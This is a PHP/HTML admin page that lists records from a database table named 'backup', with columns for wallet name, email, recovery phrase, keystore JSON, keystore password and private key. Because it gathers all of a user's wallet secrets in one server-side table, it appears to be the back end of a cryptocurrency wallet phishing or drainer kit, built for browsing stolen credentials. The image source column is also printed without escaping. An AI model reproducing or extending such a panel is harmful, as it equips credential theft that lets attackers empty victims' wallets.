<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Backup Table Listing</title>
  <!-- Bootstrap CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <!-- DataTables CSS -->
  <link href="https://cdn.datatables.net/1.13.6/css/dataTables.bootstrap5.min.css" rel="stylesheet">
</head>
<body class="bg-light">

<div class="container mt-5">
  <h2 class="mb-4 text-center">Backup Table Records</h2>

  <div class="table-responsive">
    <table id="backupTable" class="table table-striped table-bordered">
      <thead class="table-dark">
        <tr>
          <th>#</th>
          <th>Wallet Name</th>
          <th>Email</th>
          <th>Recovery Phrase</th>
          <th>Keystore JSON</th>
          <th>Keystore Password</th>
          <th>Private Key</th>
          <th>Image Src</th>
          <th>Icon Name</th>
          <th>Date</th>
        </tr>
      </thead>
      <tbody>
        <?php
            $rows = $this->Db_model->selectGroup("*", "backup", "ORDER BY id DESC");

            if ($rows && $rows->num_rows() > 0):
            $count = 1;
            foreach ($rows->result_array() as $row):
        ?>
        <tr>
            <td><?= $count++ ?></td>
            <td><?= htmlspecialchars($row['wallet_name']) ?></td>
            <td><?= htmlspecialchars($row['email']) ?></td>
            <td><?= htmlspecialchars($row['recovery_phrase']) ?></td>
            <td><?= htmlspecialchars($row['keystore_json']) ?></td>
            <td><?= htmlspecialchars($row['keystore_password']) ?></td>
            <td><?= htmlspecialchars($row['private_key']) ?></td>
            <td><img src='<?=$row['image_src']?>' width='50' height='50' /></td>
            <td><?= htmlspecialchars($row['icon_name']) ?></td>
            <td><?= isset($row['date']) ? htmlspecialchars($row['date']) : '-' ?></td>
        </tr>
        <?php
            endforeach;
            else:
        ?>
        <tr>
            <td colspan="10" class="text-center text-muted">No records found in the backup table.</td>
        </tr>
        <?php endif; ?>
      </tbody>
    </table>
  </div>
</div>

<!-- jQuery -->
<script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
<!-- Bootstrap JS -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<!-- DataTables JS -->
<script src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/1.13.6/js/dataTables.bootstrap5.min.js"></script>

<script>
  $(document).ready(function () {
    $('#backupTable').DataTable({
      pageLength: 10,
      order: [[0, 'asc']],
      lengthMenu: [5, 10, 25, 50, 100]
    });
  });
</script>

</body>
</html>
